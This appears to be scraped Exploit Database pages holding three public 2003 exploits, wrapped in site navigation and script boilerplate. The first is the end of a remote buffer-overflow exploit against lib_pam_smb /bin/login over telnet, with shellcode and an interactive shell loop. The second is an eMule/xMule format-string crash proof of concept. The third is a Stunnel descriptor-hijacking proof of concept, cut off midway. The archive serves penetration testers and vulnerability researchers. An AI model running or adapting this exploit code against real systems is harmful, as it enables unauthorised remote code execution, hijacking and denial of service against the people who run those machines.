="hAAAAX5AAAAHPPPPPPPPahA000X5nCX0PhA004X5nRYZPh0A""DAX5owxnPTYI19II19h0200X5U9knPTYII19I19hA000X5sO""kBPTY19I19I19h4000X59cF4PTY19II19I19h0000X5000FP""TY19I19h0002X500w9PTYI19I19h0A00X5uR00PTYII19I19""h04AAX5ByVyPTY19II19I19h600AX59FMVPTY19I19I19h00""0AX500LZPTY19II19h00E0X5Btz0PTYII19hA4A0X5R8p9PT""Y19I19II19h0D20X5Lx8LPTY19h0000X5000kPh00A0X5fcV""0PTYI19I19h00B0X5eFXgPTYI19II19\xff\xff\xe4";int main(int argc,char **argv){struct sockaddr_in sock;struct hostent *pHe;int sd;short port = -1;int x;char *host = NULL;char *user = NULL;char exp[1024];int a;char *default_port = "23";printf("linux_pam_smb\n");printf("Linux lib_pam_smb < 1.1.6 /bin/login remote exploit\n");printf("[vertex//lids/org]\n\n");if (argc < 2){printf("%s -h <victim> [-p port] \n",argv[0]);return 0;}while ((a = getopt(argc,argv,"h:p:u:")) != -1){switch (a){case 'h':host = optarg;break;case 'p':port = atoi(optarg);break;default:printf("[-] invalid option.\n");break;}}if (host == NULL){printf("[-] must specify a host to attack\n");return 0;}if (port < 0)port = atoi(default_port);if ((pHe = gethostbyname(host)) == NULL){printf("Host lookup error.\n");return 0;}printf("[*] attacking %s:%d\n",host,port);printf("[*] opening socket\n");if ((sd = socket(AF_INET,SOCK_STREAM,0)) == -1){printf("[-] could not create socket");return 0;}sock.sin_family = AF_INET;sock.sin_port = htons(port);memcpy(&sock.sin_addr.s_addr,pHe->h_addr,pHe->h_length);if ((connect(sd,(struct sockaddr *)&sock,sizeof(sock))) == -1){printf("[-] failed to connect to %s\n",host);return 0;}printf("[*] connected!\n");printf("[*] Begin negotiate... \n");negotiate(sd);printf("[*] Login... \n");login(sd);return 0;}void login(int sd){char buf[1024];char exploit_buf[172];char cx[3]="\r\n\0";int x;fd_set rset;memset(exploit_buf,'\0',172);/* let's jump to 0xbffffe30 *//* eb 30 fe ff bf */x = 0;exploit_buf[x++]=0x68;/* push 0xbffffe30 *//* shellcode address */exploit_buf[x++]=0x30;exploit_buf[x++]=0xfe;exploit_buf[x++]=0xff;exploit_buf[x++]=0xff;exploit_buf[x++]=0xff;exploit_buf[x++]=0xbf;exploit_buf[x++]=0xbf;/* ret */exploit_buf[x++]=0xc3;memset(exploit_buf+x,'A',150);x+=150;/* will jmp in the middle of the NOP *//* overwrite the eip with 0x40000f4f libc-2.3.2 *//* at this address it ispop $exxpop $exxret*/exploit_buf[x++]=0xb5;exploit_buf[x++]=0xd4;sleep(2);memset(buf,'\0',sizeof(buf));strcpy(buf, "xie\r\n\0");printf("[*] sending username \n");sendstr(sd,buf,strlen(buf));sleep(1);printf("[*] sending password\n");sleep(2);memset(buf,'\0',sizeof(buf));strcpy(buf, exploit_buf);strcat(buf,"\r\n\0");sendstr(sd,buf,strlen(buf));sleep(2);fflush(stdout);FD_ZERO(&rset);while (1){FD_SET(sd,&rset);FD_SET(0,&rset);select(sd+1,&rset,0,0,0);if (FD_ISSET(sd,&rset)){memset(buf,'\0',sizeof(buf));if ((x = read(sd,buf,sizeof(buf)-1)) == 0){printf("Connection closed by foreign host.\n");exit(-1);}fprintf(stderr,"%s",buf);}if (FD_ISSET(0,&rset)){memset(buf,'\0',sizeof(buf));if ((x = read(0,buf,sizeof(buf)-1)) > 0){write(sd,buf,x);}}}}/** telnet negotiation needed for* talking with the telnet protocol*/void negotiate(int sd){char buf[1024];char nop[64];int len;sendstr(sd, packet_1,sizeof(packet_1));sleep(2);memset(buf,'\0',sizeof(buf));memset(nop,'A',sizeof(nop));memcpy(buf,packet_2,sizeof(packet_2));/* adding NOP */memcpy(buf+sizeof(packet_2), nop, sizeof(nop));/* shellcode */memcpy(buf+sizeof(packet_2)+sizeof(nop), sc, sizeof(sc));/* left packet */memcpy(buf+sizeof(packet_2)+sizeof(nop)+sizeof(sc),packet_2_1,sizeof(packet_2_1));len = sizeof(packet_2) +sizeof(packet_2_1) + sizeof(nop)+sizeof(sc) ;sendstr(sd, buf, len);sleep(1);/* wont echo */wont(sd,TELOPT_ECHO);sleep(1);/* do echo */cmd(sd,TELOPT_ECHO);sleep(2);}/** send a telnet WONT** structure of a telnet WONT is:* 	1. IAC* 	2. WONT*	3. what you wont do*	(all of the above are found in arpa/telnet.h)*/void wont(int sd,int opt){char buf[3];sprintf(buf,"%c%c%c",IAC,WONT,opt);write(sd,buf,3); /* no error checking, uh-oh! */}/** send a telnet WILL** structure of a telnet WILL is:*	1. IAC*	2. WILL*	3. what you will do*	(all of the above are found in arpa/telnet.h)*/void will(int sd,int opt){char buf[3];sprintf(buf,"%c%c%c",IAC,WILL,opt);write(sd,buf,3); /* no error checking, uh-oh! */}void cmd(int sd,int opt){char buf[3];sprintf(buf,"%c\xfd%c",IAC,opt);write(sd,buf,3); /* no error checking, uh-oh! */}/***/void sendstr(int sd,char *str,int length){write(sd,str,length);sleep(1);}// milw0rm.com [2003-08-29]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 90
eMule/xMule/LMule - OP_SERVERMESSAGE Format String - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDeMule/xMule/LMule - OP_SERVERMESSAGE Format StringEDB-ID:90CVE:EDB Verified:Author:RÃ©mi Denis-CourmontType:remoteExploit:/Platform:WindowsDate:2003-09-01Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** eMule/xMule/LMule OP_SERVERMESSAGE Format String Vulnerability* (SecurityFocus BID 8443)* proof of concept code* version 1.0 (Aug 29 2003)** by Rémi Denis-Courmont** This vulnerability was found by:*   Stefan Esser <s.esser@e-matters.de>* whose original advisory may be fetched from:*   http://security.e-matters.de/advisories/022003.html** Vulnerable:*  - eMule v0.29c -> wait for server connection timeout (!?! I need help !?!)*  - xMule stable v1.4.3 -> crash*  - xMule unstable v1.5.6a -> crash*  - Lmule v1.3.1 (NOT tested) -> ???**   There is something wrong with eMule 0.29c (exception handling) and it* refuses to crash.** Not vulnerable:*  - xMule stable v1.6.0,*  - eMule v0.30a.**   As a format string vulnerability over a possibly large format input* buffer, experienced assembly coders (ie. NOT me) should be able to exploit* this vulnerability (you can find as much as 2 mega-bytes available in the* stack in the socket input buffer, and the message is also duplicated on* the heap and can be as long as 65535 bytes). However, getting clients to* connect to while not impossible, will be very very hard: Even though many* clients adds current server of other clients to their own server lists, so* that you can promote yourself as a server by actively connecting to others,* it is unlikely that your "server" will be selected from the list which* often exceeds 100 entries.*   Anyway, the following proof-of-concept is entirely passive, so you will* probably only be able to test it against yourself (which is very fine,* because you usually are you only legal victim).*//****************************************************************************** Copyright (C) 2003  Rémi Denis-Courmont.  All rights reserved.            **                                                                           ** Redistribution and use in source and binary forms, with or without        ** modification, are permitted provided that the following conditions        ** are met:                                                                  ** 1. Redistributions of source code must retain the above copyright         **    notice, this list of conditions and the following disclaimer.          ** 2. Redistributions in binary form must reproduce the above copyright      **    notice, this list of conditions and the following disclaimer in the    **    documentation and/or other materials provided with the distribution.   **                                                                           ** THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      ** IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES ** OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   ** IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          ** INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  ** NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, ** DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     ** THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       ** (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  ** THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         ******************************************************************************/#include <stdio.h>#include <stdint.h>#include <sys/types.h>#include <sys/socket.h>#include <unistd.h>#include <netdb.h>int gai_errno = 0;voidgai_perror (const char *str){if ((gai_errno == EAI_SYSTEM) || (gai_errno == 0))perror (str);elsefprintf (stderr, "%s: %s\n", str, gai_strerror (gai_errno));}intsocket_listen (const char *hostname, const char *servname){struct addrinfo hints, *res;hints.ai_family = PF_INET;hints.ai_socktype = SOCK_STREAM;hints.ai_protocol = 0;hints.ai_flags = AI_PASSIVE;if ((gai_errno = getaddrinfo (hostname, servname, &hints, &res)) == 0){struct addrinfo *ptr;for (ptr = res; ptr != NULL; ptr = ptr->ai_next){int sock;sock = socket (ptr->ai_family, ptr->ai_socktype,ptr->ai_protocol);if (sock != -1){const int val = 1;setsockopt (sock, SOL_SOCKET, SO_REUSEADDR,&val, sizeof (val));if (bind (sock, ptr->ai_addr, ptr->ai_addrlen)|| listen (sock, INT_MAX))close (sock);else{/* success! */freeaddrinfo (res);return sock;}}}freeaddrinfo (res);}return -1;}intsend_server_message (int fd/*, const char *message*/){/** Note that eDonkey is an Intel-centric protocol that sends/receives* everything in counter-network-byte order (ie. low order first).*/uint8_t buf[] ="\xE3" // protocol"\x70\x01\x00\x00" // packet size"\x38" // command (Server message)"\x6D\x01" // message length (xMule ingores it, eMule reads it)"%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n""Welcome to messmule, a proof-of-concept for:\n""eMule/xMule/Lmule OP_SERVERMESSAGE\n""Format String Vulnerability\n""%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n""If you can read this message from your Server info box,\n""your client is probably not affected by that vulnerability.\n""%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n";return (send (fd, buf, sizeof (buf) - 1, 0) != (sizeof (buf) - 1));}static intusage (const char *path){printf ("Syntax: %s [port [hostname|IP]]\n""        Attempt to crash eMule/xMule/LMule clients which will connect to\n""        the specified server port (or 4661 by default), at the local\n""        host address (or any available address by default)\n", path);return 2;}intmain (int argc, char *argv[]){puts ("eMule/xMule/LMule OP_SERVERMESSAGE ""Format String Vulnerabilitytion Vulnerability\n""proof of concept code\n""Copyright (C) 2003 Rémi Denis-Courmont ""<exploit@simutrans.fr.st>\n");if (argc > 3)return usage (argv[0]);else{int listenfd;const char *host, *port;port = (argc < 2) ? "4661" : argv[2];host = (argc < 3) ? NULL : argv[3];printf ("Binding to [%s]:%s ...\n",(host != NULL) ? host : "any", port);listenfd = socket_listen (host, port);if (listenfd == -1){gai_perror (host);return 1;}while (1){int clientfd;fputs ("Waiting for a client to connect ... ", stdout);clientfd = accept (listenfd, NULL, 0);if (clientfd == -1){puts ("");perror ("Error");continue;}puts ("OK");fputs ("Sending server message ... ", stdout);if (send_server_message (clientfd)){puts ("");perror ("Error");}elseputs ("Done");close (clientfd);}}return 0; /* dead code */}// milw0rm.com [2003-09-01]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 91
Stunnel 3.24/4.00 - Daemon Hijacking - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDStunnel 3.24/4.00 - Daemon HijackingEDB-ID:91CVE:2003-0740EDB Verified:Author:Steve GrubbType:localExploit:/Platform:LinuxDate:2003-09-05Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* By Steve Grubb : The technique is simple.** 1) Fork so that stunnel can't find you when it dies.* 2) Send stunnel a SIGUSR2. Unhandled signals generally* kill programs. Since you are a child of stunnel, the OS* will deliver the signal.* 3) Select on the leaked descriptor and start serving pages.** At the end of this advisory is a proof-of-concept* program that you can run under Stunnel. It is assumed* that Stunnel is providing you shell-like access (Telnet* over SSL, for example), or that the program lauched via* Stunnel has some exploitable condition that allows you* to run arbitrary code.** To run the POC code, you can execute it directly as the* local program (-l argument) for Stunnel :** /usr/sbin/stunnel -s nobody -g nobody -D 7 -p* /etc/ssl/certs/stunnel.pem -o /tmp/stunnel.log -P* /tmp/stunnel.pid -d 2222 -l* /opt/stunnel-sploit/leak-sploit -- leak-sploit** Then connect to stunnel like: lynx https://localhost:2222** The first time, you will get a message saying* "Unexpected network read error" followed by "Document* can't be accessed". Then connect again. The second* time, you will see the "You're owned" message. Doing a* ps -ef shows that stunnel is long gone and replaced by* the example application...even though user & group were* nobody. Sure its a bit contrived, but illustrates the concept.*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <signal.h>#include <errno.h>#include <sys/select.h>#include <netinet/in.h>#include <openssl/ssl.h>/** The basic scheme goes like this:*      1) Get rid of the parent*      2) init the openssl library*      3) start handling requests*//* You may need to adjust these next 3 items */#define LISTEN_DESCRIPTOR 6#define CERTF "/opt/stunnel-sploit/foo-cert.pem"#define KEYF  "/opt/stunnel-sploit/foo-cert.pem"static SSL_CTX    *ctx;static SSL        *ssl;static X509       *client_cert;static SSL_METHOD *meth;static void server_loop(int descr);static void ssl_init(void);int main(int argc, char *argv[]){int pid = getppid();/* Need to fork so stunnel doesn't kill us */if (fork() == 0) {/* Become session leader */setsid();/* Goodbye - thanks for the descriptor */kill(pid, SIGUSR2);close(0); close(1); close(2);ssl_init();server_loop(LISTEN_DESCRIPTOR);}return 0;}static void server_loop(int descr){struct timeval   tv;fd_set read_mask ;FD_SET(descr, &read_mask);for (;;) {struct sockaddr_in remote;socklen_t len = sizeof(remote);int fd;if (select(descr+1, 